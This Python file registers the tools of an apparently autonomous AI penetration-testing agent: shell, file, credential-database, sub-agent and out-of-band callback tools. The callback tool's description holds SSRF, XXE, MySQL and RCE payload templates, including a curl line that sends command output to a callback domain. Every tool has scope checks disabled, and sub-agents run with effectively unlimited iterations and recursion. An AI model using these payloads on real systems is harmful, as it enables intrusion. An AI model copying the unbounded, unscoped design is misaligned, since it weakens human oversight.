"""内置工具 Schema 定义 + 注册入口。

纯声明式数据：_BUILTIN_TOOLS 列表将 ToolDef + 执行器配对，
init_builtin_tools() 负责批量注册到全局注册表。
"""

from __future__ import annotations

from pathlib import Path
from typing import Any, Callable

from graphpt.db.conn import open_db

from graphpt.tools.builtin import (
    _exec_read_file,
    _exec_edit_file,
    _exec_grep,
    _exec_glob,
    _exec_run_command,
    _exec_write_note,
)
from graphpt.tools.core import ToolDef, ToolExecutor, register_tool
from graphpt.tools.db_tools import exec_db_query, exec_db_write


def _exec_db_query_adapter(
    arguments: dict[str, Any],
    *,
    db_file: Any = None,
    task_id: int = 0,
    workspace_root: Any = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """db_query 注册执行器：从 kwarg 取 db_file 注入到共享实现。"""
    if db_file is None:
        return {"error": "db_file not available — DB tools require agent loop context", "success": False}
    return exec_db_query(arguments, db_file=db_file, task_id=task_id, workspace_root=workspace_root)


def _exec_db_write_adapter(
    arguments: dict[str, Any],
    *,
    db_file: Any = None,
    task_id: int = 0,
    **kwargs: Any,
) -> dict[str, Any]:
    """db_write 注册执行器：从 kwarg 取 db_file 注入到共享实现。"""
    if db_file is None:
        return {"error": "db_file not available — DB tools require agent loop context", "success": False}
    return exec_db_write(arguments, db_file=db_file, task_id=task_id)


_BUILTIN_TOOLS: list[tuple[ToolDef, ToolExecutor]] = [
    (
        ToolDef(
            name="Bash",
            description="执行 shell 命令。",
            parameters={
                "type": "object",
                "properties": {
                    "command": {"type": "string"},
                    "timeout_s": {"type": "number", "default": 120},
                },
                "required": ["command"],
            },
            risk_level="high",
            needs_scope_check=False,
            approval_policy="manual_only",
        ),
        _exec_run_command,
    ),
    (ToolDef(name="Read", description="读文件。支持 @skill/<name>、@poc/<id>、@asset/<category> 前缀引用知识库。", parameters={"type": "object", "properties": {"path": {"type": "string"}, "offset": {"type": "integer", "default": 0}, "limit": {"type": "integer", "default": 8000, "description": "读取字符数，不传则返回全文"}}, "required": ["path"]}, risk_level="low", needs_scope_check=False), _exec_read_file),
    (ToolDef(name="Write", description="写文件(覆盖/追加)。@evidence/<id> 写漏洞证据;@asset/<category> 追加资产(自动去重,mode=append)。", parameters={"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}, "mode": {"type": "string", "enum": ["overwrite", "append"], "default": "overwrite"}}, "required": ["path", "content"]}, risk_level="low", needs_scope_check=False), _exec_write_note),
    # 统一 DB 查询入口:替代 search_findings/search_credentials/search_http_traffic
    (ToolDef(
        name="db_query",
        description=(
            "查任务的内置 sqlite 表。table 字段选择目标表,filter 透传到该表的过滤字段。\n"
            "- findings: 漏洞/资产/凭据等发现池。filter: {category, status, keyword, limit, offset}\n"
            "  category ∈ domain/subdomain/ip/port/url/vuln/credential/info/config/attack_path\n"
            "  status ∈ new/investigating/confirmed/dismissed\n"
            "- credentials: 已收集的用户名/密码/Token。filter: {keyword, credential_type, status, limit, offset}\n"
            "  credential_type ∈ password/token/api_key/ssh_key/cookie/hash/other\n"
            "- http_traffic: 历史 HTTP 请求/响应。filter: {url_pattern, method, status_code, status_range, body_keyword}\n"
            "  或顶层传 id 直接查单条完整记录"
        ),
        parameters={
            "type": "object",
            "properties": {
                "table": {"type": "string", "enum": ["findings", "credentials", "http_traffic"]},
                "filter": {"type": "object", "description": "按表的过滤字段,见 description"},
                "id": {"type": "integer", "description": "仅 http_traffic 用,直接查单条"},
                "limit": {"type": "integer"},
                "offset": {"type": "integer"},
            },
            "required": ["table"],
        },
        risk_level="low",
        needs_scope_check=False,
    ), _exec_db_query_adapter),
    # 统一 DB 写入入口:替代 update_finding / save_credential
    (ToolDef(
        name="db_write",
        description=(
            "写任务的内置 sqlite 表。table 选择目标表,record 为字段集。\n"
            "- findings: upsert finding。若 finding_id 匹配或 finding_title+canonical_target+category 匹配已有记录则 UPDATE,否则 INSERT 新记录。\n"
            "  record: {finding_id?, finding_title, canonical_target?, category?, status?, triage_score?, detail?, severity?, confidence?}\n"
            "  status ∈ new/investigating/confirmed/dismissed\n"
            "- credentials: 新增凭据。record: {target, username, password, credential_type, source, notes}\n"
            "  credential_type ∈ password/token/api_key/ssh_key/cookie/hash/other (默认 password)"
        ),
        parameters={
            "type": "object",
            "properties": {
                "table": {"type": "string", "enum": ["findings", "credentials"]},
                "record": {"type": "object", "description": "字段集,见 description"},
            },
            "required": ["table", "record"],
        },
        risk_level="low",
        needs_scope_check=False,
    ), _exec_db_write_adapter),
]


def init_builtin_tools() -> None:
    """注册所有内置工具。"""
    for tool_def, executor in _BUILTIN_TOOLS:
        register_tool(tool_def, executor)

    # 浏览器工具已移除 — MCP playwright 提供更稳定的 browser_navigate/snapshot/click
    # from graphpt.core.browser import get_browser_tool_defs
    # for tool_def, executor in get_browser_tool_defs():
    #     register_tool(tool_def, executor)

    # B6.4: declare_progress 工具已移除。语义改为:
    # - dead_end → db_write(table="findings", record={finding_id, status:"dismissed"})
    # - pivot/done → 模型在文本里说明即可,无副作用
    # - need_help → 文本说明 "NEED_HELP: <reason>" + Write 落盘到 @evidence/

    # 多步任务待办清单(覆盖式提交,至多一项 in_progress)
    register_tool(
        ToolDef(
            name="TodoWrite",
            description="维护多步任务待办清单。3+ 步任务开工前建清单,每完成一步立即更新。覆盖式提交,至多一项 in_progress。",
            parameters={
                "type": "object",
                "properties": {
                    "todos": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "content": {"type": "string", "description": "祈使句"},
                                "status": {"type": "string", "enum": ["pending", "in_progress", "completed"]},
                                "activeForm": {"type": "string", "description": "进行中展示文案(现在进行时);留空则用 content"},
                            },
                            "required": ["content", "status"],
                        },
                    },
                },
                "required": ["todos"],
            },
            risk_level="low",
            needs_scope_check=False,
        ),
        _exec_update_todos,
    )

    # 文件操作:工作区路径校验内置,越界拦截
    register_tool(
        ToolDef(
            name="Edit",
            description="精确字符串替换。old_string 须唯一命中(或 replace_all=true)。编辑前先 Read 看原文。",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string"},
                    "old_string": {"type": "string"},
                    "new_string": {"type": "string"},
                    "replace_all": {"type": "boolean", "default": False},
                },
                "required": ["path", "old_string", "new_string"],
            },
            risk_level="medium",
            needs_scope_check=False,
        ),
        _exec_edit_file,
    )
    register_tool(
        ToolDef(
            name="Grep",
            description="工作区文件内容正则搜索。返回 file:line:text。",
            parameters={
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "正则"},
                    "path": {"type": "string", "default": "", "description": "起点,留空=根"},
                    "glob": {"type": "string", "default": "", "description": "文件名通配,如 '*.py'"},
                    "ignore_case": {"type": "boolean", "default": False},
                    "limit": {"type": "integer", "default": 200, "description": "返回匹配数上限"},
                },
                "required": ["pattern"],
            },
            risk_level="low",
            needs_scope_check=False,
        ),
        _exec_grep,
    )
    register_tool(
        ToolDef(
            name="Glob",
            description="按通配查找文件,如 '**/*.py'。按修改时间倒序。",
            parameters={
                "type": "object",
                "properties": {
                    "pattern": {"type": "string"},
                    "path": {"type": "string", "default": "", "description": "起点,留空=根"},
                    "limit": {"type": "integer", "default": 200, "description": "返回匹配数上限"},
                },
                "required": ["pattern"],
            },
            risk_level="low",
            needs_scope_check=False,
        ),
        _exec_glob,
    )

    # 子代理委派:子代理上下文隔离,只回传最终结论
    register_tool(
        ToolDef(
            name="Task",
            description="派生隔离上下文的子代理完成聚焦子任务。prompt 必须自包含(子代理看不到主对话)。共享工作区/范围/凭据库。可递归派子代理。",
            parameters={
                "type": "object",
                "properties": {
                    "prompt": {"type": "string", "description": "自包含任务:目标+范围+约束+期望产出"},
                    "description": {"type": "string", "description": "3-5 字短标签,可选"},
                    "max_iterations": {"type": "integer", "default": 999999, "description": "子代理最大迭代数"},
                },
                "required": ["prompt"],
            },
            risk_level="medium",
            needs_scope_check=False,
        ),
        _exec_dispatch_agent,
    )

    # OOB 回调验证：盲 SSRF/XXE/RCE/SQL 注入验证
    from graphpt.tools.builtin import _exec_oob_callback
    register_tool(
        ToolDef(
            name="oob_callback",
            description=(
                "OOB(Out-of-Band)回调验证,通过 interactsh 公共服务器中转,"
                "验证盲 SSRF/XXE/RCE/SQL 注入等无回显漏洞。\n"
                "流程: start → 启动 interactsh,获取回调域名 → "
                "generate → 为每个测试生成唯一子域名 payload → "
                "将 payload 注入目标 → poll → 检查目标是否回调 → "
                "stop → 关闭。\n"
                "目标对该域名的 DNS/HTTP/SMTP 请求会经由公共服务器中转回本地,"
                "无需本机有公网 IP。\n"
                "payload 用法示例:\n"
                "- 盲 SSRF: http://<domain_payload>/admin 注入 URL 参数\n"
                "- 盲 XXE: <!ENTITY % dtd SYSTEM 'http://<domain_payload>/evil'>\n"
                "- 盲 RCE: nslookup <domain_payload> 或 curl http://<domain_payload>/$(cmd)\n"
                "- 盲 SQL(MySQL): LOAD_FILE('\\\\\\\\<domain_payload>\\\\test')"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["start", "poll", "stop", "generate", "status"],
                        "description": (
                            "start: 启动 interactsh 客户端,获取回调域名(支持 DNS+HTTP+SMTP)。"
                            "poll: 检查目标是否有回调记录。"
                            "stop: 关闭客户端。"
                            "generate: 生成唯一子域名 payload(如 abc123.your.oast.pro)。"
                            "status: 查看当前状态。"
                        ),
                    },
                    "server": {
                        "type": "string",
                        "default": "",
                        "description": "start 时指定自定义 interactsh 服务器,留空用公共服务器。",
                    },
                    "timeout_s": {
                        "type": "number",
                        "default": 2.0,
                        "description": "poll 时等待新交互的秒数,0=立即返回已有记录。",
                    },
                    "label": {
                        "type": "string",
                        "default": "",
                        "description": "generate 时附加可读标签(如 'ssrf-aws'),poll 结果自动关联。",
                    },
                },
                "required": ["action"],
            },
            risk_level="high",
            needs_scope_check=False,
        ),
        _exec_oob_callback,
    )


# TodoWrite 式任务清单：每次调用提交「完整」清单，覆盖式更新。
_TODO_STATUSES = ("pending", "in_progress", "completed")


def _exec_update_todos(
    arguments: dict[str, Any],
    *,
    task_id: int = 0,
    **kwargs: Any,
) -> dict[str, Any]:
    """更新当前任务清单（TodoWrite 式）。

    模型每次提交「完整」清单（覆盖式，而非增量），系统校验后回显归一化清单，
    并通过 SSE 推 todo_updated 事件给 CLI 渲染。清单本身不在服务端落库——
    它随对话历史天然续存（模型每轮带着上次的清单再改），符合 Claude Code 语义。

    校验：
    - todos 必须是数组；每项含非空 content + 合法 status；
    - 至多一项 in_progress（Claude Code 同款约束，避免"并行假象"）。
    """
    raw = arguments.get("todos")
    if not isinstance(raw, list):
        return {"success": False, "error": "invalid_todos", "message": "todos 必须是数组"}

    todos: list[dict[str, Any]] = []
    for idx, item in enumerate(raw):
        if not isinstance(item, dict):
            return {"success": False, "error": "invalid_item", "message": f"第 {idx + 1} 项不是对象"}
        content = str(item.get("content", "")).strip()
        if not content:
            return {"success": False, "error": "empty_content", "message": f"第 {idx + 1} 项 content 为空"}
        status = str(item.get("status", "pending")).strip().lower()
        if status not in _TODO_STATUSES:
            return {"success": False, "error": "invalid_status", "message": f"第 {idx + 1} 项 status 非法（须为 pending/in_progress/completed）"}
        active_form = str(item.get("activeForm", "")).strip() or content
        todos.append({"content": content, "status": status, "activeForm": active_form})

    in_progress = [t for t in todos if t["status"] == "in_progress"]
    if len(in_progress) > 1:
        return {"success": False, "error": "multiple_in_progress", "message": f"同时只能有一项 in_progress，当前有 {len(in_progress)} 项"}

    counts = {s: sum(1 for t in todos if t["status"] == s) for s in _TODO_STATUSES}
    if task_id:
        try:
            from graphpt.core.sse import sse_publish
            sse_publish(task_id, {"type": "todo_updated", "todos": todos, "counts": counts})
        except Exception:  # noqa: BLE001 — 渲染推送失败不应中断工具
            pass

    return {
        "success": True,
        "todos": todos,
        "counts": counts,
        "message": f"任务清单已更新：{counts['completed']}/{len(todos)} 完成",
    }


# 子代理无工具黑名单
_SUBAGENT_EXCLUDED_TOOLS: frozenset[str] = frozenset()


def _exec_dispatch_agent(
    arguments: dict[str, Any],
    *,
    workspace_root: Path | None = None,
    db_file: Any = None,
    task_id: int = 0,
    stop_event: Any = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """派生隔离上下文的子代理执行一个聚焦子任务（对齐 Claude Code 的 Task）。

    子代理有自己独立的对话历史与受限工具集，跑一个嵌套 run_agent_loop，
    只把最终文字结论回传给主代理，从而保护主上下文不被中间过程淹没。


    ai_config 等运行上下文不由工具分发器注入，故从 run_agent_loop 在入口挂的
    contextvar（get_agent_run_context）读取。dispatch_agent 只走串行路径，
    必然与挂 contextvar 的 loop 同线程，因此可见。
    """
    from graphpt.core.agent_loop import (
        get_agent_run_context,
        run_agent_loop,
    )
    from graphpt.tools.core import get_all_tool_schemas

    prompt = str(arguments.get("prompt", "")).strip()
    if not prompt:
        return {"success": False, "error": "prompt_required", "message": "必须提供 prompt（要委派给子代理的任务描述）"}
    description = str(arguments.get("description", "")).strip()

    ctx = get_agent_run_context()
    if not ctx or ctx.get("ai_config") is None:
        return {"success": False, "error": "no_agent_context", "message": "dispatch_agent 只能在 agent 循环内调用"}

    depth = int(ctx.get("depth", 0))

    try:
        max_iterations = int(arguments.get("max_iterations", 999999))
    except (TypeError, ValueError):
        max_iterations = 999999

    sub_tools = [
        schema
        for schema in get_all_tool_schemas()
        if schema.get("function", {}).get("name") not in _SUBAGENT_EXCLUDED_TOOLS
    ]

    sub_system_prompt = (
        "你是主代理派生的子代理（sub-agent），负责独立完成一个聚焦的子任务。\n"
        "你有自己独立的对话历史和工具集，但与主代理共享同一工作区、目标范围与凭据库。\n"
        "围绕委派任务自主使用工具推进，完成后用简洁中文给出关键发现、产出文件路径和后续建议。"
        "必要时可再派生子代理分解工作。"
    )

    # B8: 预定义子代理类型 → 自动注入完整任务模板。主代理 prompt 不再嵌入 5K 字符模板,
    # 只需在 description 选类型,本次具体上下文走 prompt 参数。
    _PREDEFINED_SUBAGENTS: dict[str, str] = {}
    try:
        from graphpt.core.subagent_prompts import (
            TARGET_MODELER_TASK,
            SCAN_TRIAGE_TASK,
            SOURCE_AUDIT_TASK,
            EXPLOIT_RESEARCH_TASK,
        )
        _PREDEFINED_SUBAGENTS = {
            "target_modeler": TARGET_MODELER_TASK,
            "scan_triage": SCAN_TRIAGE_TASK,
            "source_audit": SOURCE_AUDIT_TASK,
            "exploit_research": EXPLOIT_RESEARCH_TASK,
        }
    except ImportError:
        pass

    desc_key = description.strip().lower()
    if desc_key in _PREDEFINED_SUBAGENTS:
        sub_system_prompt += "\n\n" + _PREDEFINED_SUBAGENTS[desc_key].strip()
    elif description:
        sub_system_prompt += f"\n任务标签：{description}"

    # 进度回灌：子代理与父 loop 同线程，从 contextvar 取 UI 进度回调（CLI 状态栏）。
    # 给子 run_agent_loop 挂一个只计数的 HookManager：每次子工具完成 → 递增主状态栏
    # 的「子代理 N 工具」，让委派期间看得出子代理在动、没卡死。无 UI（如 web 路径）则为 None。
    from graphpt.core.agent_loop import get_agent_on_status, get_subagent_progress_cb
    from graphpt.core.hooks import HookManager

    progress = get_subagent_progress_cb()
    # 父代理 on_status callback：wrap 一下加 ↳ 前缀，让子代理状态行可视化区分。
    _parent_status = get_agent_on_status()
    # label 优先用 description；缺省时取 prompt 首 20 字符（去换行/空白），
    # 让并行多个子代理能在状态行区分开。
    if description:
        sub_label = description
    else:
        _trimmed = " ".join(prompt.split())[:20]
        sub_label = _trimmed or "子代理"

    sub_hooks = None
    if progress or _parent_status is not None:
        sub_hooks = HookManager()
        if progress:
            sub_hooks.on("tool_call", lambda _ev: progress["tool"]())
            try:
                progress["begin"]()
            except Exception:  # noqa: BLE001 — 进度仅为观测，失败不应影响委派
                pass
        if _parent_status is not None:
            # 把子代理的工具调用透传到主状态行
            def _on_sub_tool(ev: Any, *, _label: str = sub_label, _cb: Callable[[str], None] = _parent_status) -> None:
                try:
                    tn = (ev.data or {}).get("tool_name") if hasattr(ev, "data") else None
                    if tn:
                        _cb(f"↳ [{_label}] → {tn}")
                except Exception:  # noqa: BLE001
                    pass
            sub_hooks.on("tool_call", _on_sub_tool)

    sub_on_status: Callable[[str], None] | None = None
    if _parent_status is not None:
        def _sub_status(msg: str, *, _label: str = sub_label, _cb: Callable[[str], None] = _parent_status) -> None:
            try:
                _cb(f"↳ [{_label}] {msg}")
            except Exception:  # noqa: BLE001
                pass
        sub_on_status = _sub_status
        # 委派开始的可视化标记
        try:
            _parent_status(f"↳ 派发子代理: {sub_label}")
        except Exception:  # noqa: BLE001
            pass

    try:
        result = run_agent_loop(
            ai_config=ctx["ai_config"],
            system_prompt=sub_system_prompt,
            user_prompt=prompt,
            tools=sub_tools,
            max_iterations=max_iterations,
            workspace_root=workspace_root,
            db_file=db_file,
            task_id=0,  # 子代理用 0：内部工具事件不发主屏 SSE（对齐 Claude Code 折叠子代理过程），
                        # 中间步骤也不落库——它是隔离临时上下文，只回传 summary 给主代理。
            stop_event=stop_event,
            session_role="subagent",
            hooks=sub_hooks,
            on_status=sub_on_status,
        )
    finally:
        if progress:
            try:
                progress["end"]()
            except Exception:  # noqa: BLE001
                pass
        if _parent_status is not None:
            try:
                _parent_status(f"↳ 子代理完成: {sub_label}")
            except Exception:  # noqa: BLE001
                pass

    summary = (result.final_text or "").strip() or "[子代理未产出文字结论]"
    return {
        "success": True,
        "summary": summary,
        "iterations": result.iterations,
        "tool_call_count": len(result.tool_calls),
        "depth": depth + 1,
    }





